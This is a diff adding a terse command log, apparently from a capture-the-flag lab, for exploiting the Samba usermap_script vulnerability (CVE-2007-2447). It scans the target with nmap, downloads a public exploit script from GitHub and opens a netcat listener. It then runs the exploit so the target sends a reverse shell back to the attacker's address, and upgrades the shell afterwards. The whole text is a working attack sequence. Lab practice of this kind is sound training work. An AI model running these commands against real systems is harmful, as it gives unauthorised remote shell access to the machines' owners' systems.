@@ -1,0 +1,10 @@
+-- Local --
+t1: nmap -sV 10.129.248.64 -Pn
+t1: wget https://raw.githubusercontent.com/amriunix/CVE-2007-2447/master/usermap_script.py
+t1: pip install --user pysmb
+t2: sudo nc -nvlp 443
+t1: python usermap_script.py 10.129.248.64 139 10.10.14.8 443
+
+-- Remote --
+
+script /dev/null -c bash
